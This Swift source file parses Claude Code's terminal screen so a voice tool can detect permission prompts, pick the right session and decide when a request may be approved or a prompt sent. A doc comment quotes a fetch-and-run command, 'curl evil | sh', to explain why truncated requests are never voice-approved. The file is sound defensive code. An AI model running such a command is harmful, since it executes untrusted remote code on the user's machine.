import Foundation

/// A pending Claude Code permission prompt, read from the terminal's visible text.
struct RioClaudePrompt: Equatable {
    struct Option: Equatable {
        let number: Int
        let label: String
    }

    static let maxDetailLength = 600

    let question: String
    /// What the prompt is about (the command, the diff), box characters stripped.
    let context: String
    let options: [Option]
    /// The key that picks a plain "Yes" (never a standing permission); nil when there isn't one.
    let approveKey: String?
    let denyKey: String?
    /// False when the context ran past the lines Rio reads: the command's head is not in it.
    var isContextComplete = true

    static let earlierLinesMarker = "[earlier lines not shown]\n"
    static let middleMarker = "\n[\u{2026} middle not shown \u{2026}]\n"

    /// True when the panel shows the whole request. Only then may it be approved by voice: a
    /// dangerous head (`curl evil | sh; ` and 600 harmless characters) must never hide behind a
    /// benign tail (review finding).
    var isFullyShown: Bool {
        isContextComplete && context.count <= Self.maxDetailLength - question.count - 1
    }

    /// What the confirmation panel shows: the context (its head and its tail when it is too long,
    /// marked as cut), then the question. Bounded by `maxDetailLength`.
    var detail: String {
        let prefix = isContextComplete ? "" : Self.earlierLinesMarker
        let budget = max(0, Self.maxDetailLength - question.count - 1 - prefix.count)
        guard budget > 1, !context.isEmpty else { return String((prefix + question).prefix(Self.maxDetailLength)) }
        guard context.count > budget else { return prefix + context + "\n" + question }
        let room = max(0, budget - Self.middleMarker.count)
        let head = room / 2
        let shown = String(context.prefix(head)) + Self.middleMarker + String(context.suffix(room - head))
        return prefix + shown + "\n" + question
    }

    /// Identifies this prompt, so an approval runs only against the one the owner saw.
    var fingerprint: String {
        question + "|" + options.map { "\($0.number)\($0.label)" }.joined(separator: ";") + "|" + context
    }
}

/// Reads Claude Code's terminal UI from plain text. Pure.
enum RioClaudeScreen {
    /// Claude Code is auto-accepting edits or bypassing permissions, so a prompt may make it run
    /// commands without asking: Rio confirms before sending.
    static func isAutoAcceptMode(_ screen: String) -> Bool {
        let tail = screen.suffix(2000).lowercased()
        return tail.contains("bypass permissions on") || tail.contains("accept edits on")
            || tail.contains("auto-accept edits on")
    }

    private static let boxCharacters = CharacterSet(charactersIn: "│┃╭╮╰╯─━┌┐└┘├┤┬┴┼═║╔╗╚╝")
    private static let glyphStarts: [Character] = ["⏺", "✻", "⎿", "✳", "●", ">"]
    private static let standingPhrases = [
        "don't ask", "dont ask", "do not ask", "allow all", "always", "during this session", "for this session",
        "auto-accept", "auto accept", "bypass", "from now on", "and don't",
    ]
    private static let chrome =
        #"(?:^|[\s·(])(?:\?\s+for shortcuts|esc to interrupt|shift\+tab to cycle|accept edits on|bypass permissions on|plan mode on)"#

    /// One screen line without the box-drawing frame; empty for pure borders.
    static func clean(_ line: String) -> String {
        var scalars = String.UnicodeScalarView()
        for scalar in line.replacingOccurrences(of: "\u{2019}", with: "'").unicodeScalars {
            scalars.append(boxCharacters.contains(scalar) ? " " : scalar)
        }
        return String(scalars).trimmingCharacters(in: .whitespaces)
    }

    private static func cleanedLines(_ text: String, last count: Int) -> [String] {
        text.components(separatedBy: .newlines).suffix(count).map(clean)
    }

    // MARK: Is it Claude Code?

    /// True when the end of the screen carries Claude Code's own chrome (the footer hint, the
    /// busy line, the mode line, the input box or a permission prompt). The words "Claude Code"
    /// alone, or chrome far up the scrollback, are not enough: a prompt typed into a plain shell
    /// would run as a command.
    static func looksLikeClaudeCode(_ text: String) -> Bool {
        let tail = text.components(separatedBy: .newlines).suffix(60).filter { !clean($0).isEmpty }.suffix(25)
        for line in tail {
            if RioText.matches(chrome, clean(line)) { return true }
            if RioText.matches(#"^\s*[│┃]\s*>(\s|$)"#, line) { return true }
        }
        return permissionPrompt(in: text) != nil
    }

    // MARK: Permission prompt

    static func permissionPrompt(in text: String) -> RioClaudePrompt? {
        let raw = Array(text.components(separatedBy: .newlines).suffix(40))
        let lines = raw.map(clean)
        return numberedPrompt(lines, raw: raw) ?? yesNoPrompt(lines, raw: raw)
    }

    private static func optionMatch(_ line: String) -> (number: Int, label: String)? {
        guard let groups = RioText.firstMatch(#"^(?:[❯›>▶]\s*)?(\d{1,2})[.)]\s+(.+)$"#, in: line),
              let number = groups[1].flatMap({ Int($0) }), let label = groups[2] else { return nil }
        return (number, label.trimmingCharacters(in: .whitespaces))
    }

    /// The previous Claude message: a status glyph that starts the raw line (not indented, not
    /// inside a box), and not the owner's ">" input line.
    private static func isMessageBoundary(_ line: String, raw: String) -> Bool {
        guard isStatusLine(line), line.first != ">", let first = raw.first else { return false }
        return first == line.first
    }

    private static func isStatusLine(_ line: String) -> Bool {
        guard let first = line.first else { return false }
        return glyphStarts.contains(first)
    }

    private static func numberedPrompt(_ lines: [String], raw: [String]) -> RioClaudePrompt? {
        guard let lastIndex = lines.lastIndex(where: { optionMatch($0) != nil }) else { return nil }
        var start = lastIndex
        while start > 0, let current = optionMatch(lines[start]), let previous = optionMatch(lines[start - 1]),
              previous.number == current.number - 1 {
            start -= 1
        }
        guard let first = optionMatch(lines[start]), first.number == 1, lastIndex > start else { return nil }
        let options = (start...lastIndex).compactMap { optionMatch(lines[$0]) }.map {
            RioClaudePrompt.Option(number: $0.number, label: $0.label)
        }
        // Only a few footer lines may follow; anything else means the prompt was answered.
        let after = lines[(lastIndex + 1)...].filter { !$0.isEmpty }
        guard after.count <= 2, !after.contains(where: isStatusLine) else { return nil }
        // The question is the first non-blank line above the options.
        guard let questionIndex = (0..<start).reversed().first(where: { !lines[$0].isEmpty }),
              lines[questionIndex].contains("?") else { return nil }
        guard options.contains(where: { RioText.matches(#"^yes\b"#, $0.label) }) else { return nil }
        let approve = options.first { RioText.matches(#"^yes\b"#, $0.label) && !isStanding($0.label) }
        let deny = options.first { RioText.matches(#"^no\b"#, $0.label) }
        let above = context(above: questionIndex, in: lines, raw: raw)
        return RioClaudePrompt(
            question: lines[questionIndex],
            context: above.text,
            options: options,
            approveKey: approve.map { String($0.number) },
            denyKey: deny.map { String($0.number) },
            isContextComplete: above.isComplete
        )
    }

    private static func yesNoPrompt(_ lines: [String], raw: [String]) -> RioClaudePrompt? {
        let pattern = #"\?\s*[\(\[]\s*y\s*/\s*n\s*[\)\]]\s*:?$"#
        let nonEmpty = lines.indices.filter { !lines[$0].isEmpty }
        guard let index = nonEmpty.suffix(2).first(where: { RioText.matches(pattern, lines[$0]) }) else { return nil }
        let after = nonEmpty.filter { $0 > index }
        guard after.isEmpty else { return nil }
        let above = context(above: index, in: lines, raw: raw)
        return RioClaudePrompt(
            question: lines[index], context: above.text, options: [], approveKey: "y", denyKey: "n",
            isContextComplete: above.isComplete
        )
    }

    private static func isStanding(_ label: String) -> Bool {
        let lowered = label.lowercased()
        return standingPhrases.contains { lowered.contains($0) }
    }

    static let maxContextLines = 14

    /// Up to `maxContextLines` lines above the question, stopping at the previous Claude message.
    /// Complete only when that message's line is found: a glyph at column 0 of the raw screen
    /// (the request itself is boxed or indented, so a glyph inside the command can't pass for it,
    /// security review). No visible start, or the limit reached first, means incomplete.
    private static func context(above index: Int, in lines: [String], raw: [String]) -> (text: String, isComplete: Bool) {
        var collected = [String]()
        var cursor = index - 1
        var foundStart = false
        while cursor >= 0, collected.count < maxContextLines {
            if isMessageBoundary(lines[cursor], raw: raw[cursor]) { foundStart = true; break }
            collected.append(lines[cursor])
            cursor -= 1
        }
        if !foundStart, cursor >= 0 { foundStart = isMessageBoundary(lines[cursor], raw: raw[cursor]) }
        let isComplete = foundStart
        var result = [String]()
        for line in collected.reversed() {
            if line.isEmpty, result.last?.isEmpty ?? true { continue }
            result.append(line)
        }
        while result.last?.isEmpty == true { result.removeLast() }
        return (result.joined(separator: "\n"), isComplete)
    }
}

/// One terminal window's visible text, for choosing the owner's Claude Code session.
struct RioClaudeCandidate: Equatable {
    let id: Int
    let text: String
    let isFrontmostApp: Bool
    let isFocusedWindow: Bool
}

enum RioClaudeSessionPicker {
    static let terminalBundleIDs: Set<String> = [
        "com.apple.Terminal", "com.googlecode.iterm2", "dev.warp.Warp-Stable", "dev.warp.Warp", "dev.warp.Warp-Preview",
    ]

    /// The Claude Code window to act on: the frontmost app's first, then a focused window, then
    /// the first found. `needingPrompt` keeps only windows with a pending permission prompt.
    static func pick(_ candidates: [RioClaudeCandidate], needingPrompt: Bool = false) -> RioClaudeCandidate? {
        let matching = candidates.filter {
            needingPrompt ? RioClaudeScreen.permissionPrompt(in: $0.text) != nil : RioClaudeScreen.looksLikeClaudeCode($0.text)
        }
        var best: RioClaudeCandidate?
        var bestScore = -1
        for candidate in matching {
            let score = (candidate.isFrontmostApp ? 2 : 0) + (candidate.isFocusedWindow ? 1 : 0)
            if score > bestScore {
                best = candidate
                bestScore = score
            }
        }
        return best
    }
}

/// Whether a prompt may be pasted into the pane that has focus. The whole window looking like
/// Claude Code is not enough: in an iTerm or Warp split the focused pane may be a plain shell,
/// and the prompt would run there as a command. Pure.
enum RioClaudePaneCheck {
    /// `focusedText` is the focused element's own text (nil or empty when it can't be read);
    /// `paneCount` is how many terminal text areas the window has.
    static func allowsSend(focusedText: String?, windowText: String, paneCount: Int) -> Bool {
        if let focused = focusedText, !focused.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return RioClaudeScreen.looksLikeClaudeCode(focused) && RioClaudeScreen.permissionPrompt(in: focused) == nil
        }
        // Unreadable focus: only a window with a single pane can be judged by its whole text.
        return paneCount <= 1 && RioClaudeScreen.looksLikeClaudeCode(windowText)
            && RioClaudeScreen.permissionPrompt(in: windowText) == nil
    }
}

enum RioClaudeSend {
    static let maxLength = 2_000

    /// One line of plain prompt text, or nil when it is empty, too long, or would not be a
    /// prompt ("!" is Claude Code's shell mode, "/" a slash command).
    static func sanitise(_ text: String) -> String? {
        let line = RioText.collapseWhitespace(text)
        guard !line.isEmpty, line.count <= maxLength, let first = line.first, first != "!", first != "/" else { return nil }
        return line
    }
}
